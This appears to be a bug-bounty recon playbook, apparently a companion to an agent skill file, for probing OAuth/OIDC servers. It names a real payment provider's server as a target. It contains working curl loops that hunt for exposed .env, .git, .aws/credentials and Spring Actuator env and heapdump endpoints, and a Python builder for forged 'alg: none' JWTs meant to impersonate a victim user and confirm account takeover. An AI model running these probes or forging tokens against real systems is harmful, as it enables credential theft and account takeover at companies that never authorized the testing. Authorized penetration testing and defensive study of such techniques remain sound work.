# OAuth / OIDC Recon Patterns

Companion to SKILL.md §25 (OIDC discovery-document misconfiguration). Real-world probing recipes discovered during `connect.paymaya.com` recon (Maya Connect OAuth server, 2026).

## 1. Endpoints to probe (no auth needed)

```bash
# Standard OIDC + OAuth discovery
curl -sL "$TARGET/.well-known/openid-configuration" | python3 -m json.tool
curl -sL "$TARGET/.well-known/oauth-authorization-server" | python3 -m json.tool  # RFC 8414
curl -sL "$TARGET/.well-known/jwks.json" | python3 -m json.tool
curl -sL "$TARGET/jwk" | python3 -m json.tool                                       # non-standard alt

# Other endpoints referenced by the discovery document
curl -sL "$TARGET/authorize"   -H "User-Agent: $UA"   # expect 400 + missing client_id
curl -sL "$TARGET/token"       -X POST -d "grant_type=client_credentials"   # expect 401
curl -sL "$TARGET/introspect"  -X POST -d "token=invalid"                   # expect 401
curl -sL "$TARGET/userinfo"                                                       # expect 401
curl -sL "$TARGET/revoke"      -X POST -d "token=invalid"                   # expect 403
curl -sL "$TARGET/register"                                                        # expect 403 (closed)
```

**Always probe every endpoint** in the discovery document — each one maps to a different bug class.

## 2. OIDC field danger taxonomy

| Field | Dangerous | Why |
|---|---|---|
| `id_token_signing_alg_values_supported` | contains `"none"` | Server MAY accept `alg: none` JWTs → token forgery |
| `token_endpoint_auth_methods_supported` | contains `"none"` | `/token` MAY issue tokens without client credentials |
| `subject_types_supported` | `"pairwise"` w/o per-client `iss`/`aud` check | Cross-client user tracking, token confusion |
| `registration_endpoint` | present + POST works | Attacker can register a malicious client |
| `introspection_endpoint` | present + works | Token-validity oracle (cheap brute force) |
| `revocation_endpoint` | present | Cache invalidation fingerprinting |
| `scopes_supported` | write scopes listed | Documents internal API surface |
| `code_challenge_methods_supported` | missing `S256` (only `plain` or absent) | PKCE downgrade → code interception |
| `response_types_supported` | includes `"token"` (implicit flow) | Token in URL fragment → log leaks |
| `grant_types_supported` | includes `"password"` (ROPG) | Username/password direct grant — almost always a vuln |
| `userinfo_signing_alg_values_supported` | contains `"none"` | Same as ID token alg |
| `id_token_encryption_*_supported` | uses `RSA1_5` (PKCS#1 v1.5) | Bleichenbacher-class padding oracle |

## 3. JWT `alg: none` builder

```python
import base64, json, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Per RFC 7518 §3.1: alg=none MUST NOT be used unless explicitly understood
# Real attack:
header  = {"alg":"none","typ":"JWT","kid":"<copy from JWKS>"}
payload = {
    "sub": "victim_user_id",
    "iss": "<copy from OIDC issuer>",
    "aud": "<client_id>",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time()),
}
token = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."
print(token)

# Probe: curl -sL "$TARGET/userinfo" -H "Authorization: Bearer $token"
# 200 with victim data = CRITICAL (ATO confirmed)
# 401 = token rejected at runtime, but advertising "none" is still High (config disclosure)
```

## 4. Spring Boot profile leak via `x-application-context`

```
x-application-context: application:stage,errors
```

The header format is `<appName>:<profile>` (or `<appName>:<profile>,<extras>` when error handling is in the active context).

**What it tells you:**
- `application:stage` → staging deployment at production URL (CRITICAL TO REPORT)
- `application:prod,errors` → production with error handlers
- `application:dev` → dev mode enabled (full debug output possible)

**Where it appears:**
- Every response on Spring Boot / Spring Cloud apps
- `/actuator/*` endpoints
- Custom health/info endpoints

**Why it pays:**
- Confirms production-vs-staging → enables version-specific CVE targeting
- Detects split-brain deployments where prod URL serves stage code
- Compliance: BSP/PCI/etc. may require strict environment separation

## 5. `.env` vs 404 differential probe

```bash
# Static-resource handlers special-casing dot files return different status codes:
for path in /.env /.env.bak /.env.production /.env.local /.env.dist /.env.sample /.env.old \
            /.git/HEAD /.git/config /.htaccess /.well-known/security.txt; do
  code=$(curl -sL -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "$code $path"
done
# Expected pattern when handler distinguishes dot files:
#   400 /.env
#   400 /.env.bak
#   400 /.git/HEAD
#   403 /config.json
#   403 /swagger-ui
#   403 /admin
```

**Try variations:**
- `.env.production`, `.env.local`, `.env.dist`, `.env.sample`, `.env.old`, `.env.dev`, `.env.staging`
- `.git/HEAD`, `.git/config`, `.git/description`, `.git/packed-refs`
- `docker-compose.yml`, `Dockerfile`, `package.json`, `composer.json`, `.aws/credentials`

## 6. Kong gateway version + endpoint enumeration

```bash
# Detect Kong
curl -sLI "$TARGET/" | grep -i "^server:"

# Old Kong (0.x — pre-2020) has known CVEs:
#   CVE-2018-18839: LDAP bypass
#   CVE-2018-19288: Admin API default creds
#   Multiple route-bypass CVEs

# Enumerate endpoints — Kong returns 401 (not 404) for known routes
for path in /payments /payments/v1 /payments/v2 /payments/v1/checkouts /payments/v1/payment-links \
            /payments/v1/customers /payments/v1/cards /payments/v1/webhooks \
            /payments/v1/subscriptions /payments/v1/refunds /payments/v1/payouts \
            /payments/v1/tokens /payments/v1/receivers; do
  resp=$(curl -sL "$TARGET$path")
  echo "--- $path ---"
  echo "$resp" | head -c 200
done
# Look for: "Missing authentication header. Kindly include a Base64 encoded key..."
# That message = route exists + leaks auth scheme to attacker
```

## 7. Spring Boot Actuator index (latent misconfig risk)

```bash
# Index page reveals what's exposed (even when only /health is reachable)
curl -sL "$TARGET/actuator" | python3 -m json.tool

# Sample response showing only /health:
# {"_links":{"self":...,"health":...,"health-path":...}}

# If you see these in the index → CRITICAL (full env leak):
#   /env     → spring.datasource.password, JWT signing key, AWS creds
#   /heapdump → grep secrets out of JVM heap
#   /mappings → every endpoint mapped including internal ones
#   /configprops → all @ConfigurationProperties beans
#   /beans     → every bean loaded, can leak classpath / wiring

# Test each:
for ep in env heapdump mappings configprops beans metrics scheduledtasks httptrace loggers; do
  code=$(curl -sL -o /dev/null -w "%{http_code}" "$TARGET/actuator/$ep")
  echo "$code /actuator/$ep"
done
```

## 8. AWS API Gateway header disclosure

```
x-amz-apigw-id: BUDlyEuXSQ0EaSg=
x-amzn-requestid: 6700d293-4af6-4060-732-9367d4e2d903
x-amzn-errortype: ForbiddenException
x-amz-cf-pop: SIN52-P1
x-amz-cf-id: 3PgQuQrsj6_rQX4bGHQifvGLAeCaPWHyDsH7LIrKmbxMtpudw50_fw==
via: 1.1 d5f29441dead372cd342d7cb881976ce.cloudfront.net
```

**What it tells you:**
- CloudFront POP code (`SIN52-P1`) → geographic edge
- CloudFront distribution hostname (32-char random) → AWS account correlation
- `MissingAuthenticationTokenException` = **route not found, NOT auth missing** (AWS API Gateway semantics)
- `ForbiddenException` = real auth wall

**Critical distinction:** Most beginners mistake "Missing Authentication Token" for auth missing. In AWS API Gateway, that message means **the HTTP method + resource path combo doesn't exist**. Compare against `ForbiddenException` which IS real auth.

## 9. Spring / Spring Cloud response shape

For Spring-based APIs, the response shape is a giveaway:
- `"timestamp":"2026-07-30T08:55:03.756Z"` → Jackson + Spring Boot
- `"status":404,"error":"Not Found","path":"/..."` → Spring Web default
- `"detail":"No static resource X.","instance":"/X","status":404,"title":"Not Found"` → RFC 7807 problem-detail (Spring Boot 3.x)
- `application/vnd.spring-boot.actuator.v3+json` → Spring Boot 3.x

For Spring Boot **with** Spring Security:
- `"code":1000,"message":"Invalid request"` → custom error format (Spring Security with custom handler)
- `WWW-Authenticate` header → confirms Spring Security
- `JSESSIONID` cookie → server-side session
- `XSRF-TOKEN` cookie → Spring's CSRF token (sometimes leaks to unauth)

## 10. Differential response probing — the master technique

When comparing two similar endpoints, the **exact difference in response** maps to security decisions:

| Endpoint A | Endpoint B | What it tells you |
|---|---|---|
| `200` | `403` | A is public, B has auth |
| `400` | `403` | Both reach handler; A has body validation only, B has auth check |
| `403 "Unauthorized"` | `400 "Invalid body"` | B has NO auth check (handler runs body validation first) |
| `400 "Invalid request"` | `403 "Invalid resource"` | Special-case handler for B path (`.env` differential) |
| `401` | `200` | A requires auth, B is public (look for the auth scheme in the 401 message) |
| `405 Method Not Allowed` | `404` | A is configured for some methods; B isn't a route at all |

**The Memento DFM recon used this exact matrix** to discover that 23 of 30 endpoints had no authentication check (the `maker/add-order` endpoint returned `400 "Invalid request body"` for every body tested, while `funds/delete` returned `401 Unauthorized` for every body — proving that the APIGW Authorizer was set on `funds/delete` but NOT on `maker/add-order`).

## 11. CVSS-by-class cheat sheet for these patterns

```
JWT alg: none advertised + server accepts forged token      9.1 Critical
JWT alg: none advertised + server rejects at runtime        7.5 High  (config disclosure)
Spring profile leak: stage on production URL                7.5 High  (deployment disclosure + exploit enabler)
.env file present + static handler serves it               9.8 Critical
.env/403 differential alone (no file present)               3.5 Low/Info
Kong/0.x server header + admin API at /                      9.8 Critical (RCE chain)
Actuator /env exposed                                       9.8 Critical
Actuator /heapdump exposed                                  9.8 Critical
Actuator /mappings exposed                                  7.5 High
Actuator only /health exposed                               0.0 Info
AWS API Gateway headers                                     0.0 Info
Spring Security custom error codes (1000 vs 1601)            3.5 Low
```

## 12. Reporting these findings

**Telegram-friendly structure** (5-part):
1. Description — header, what server says, what it means
2. Step-by-step Reproduction — exact curl + response
3. PoC — single curl one-liner
4. Impact — concrete scenario enabled by the disclosure
5. Suggested Fix — 1-2 sentence remediation

**Do NOT include:**
- Severity label in the report file (strip before delivery)
- Bounty amount (strip before delivery)
- Estimated reward tier

**Do include:**
- The exact header value or response that proves the issue
- A one-liner curl that reproduces
- A concrete chain or attack scenario enabled by the disclosure
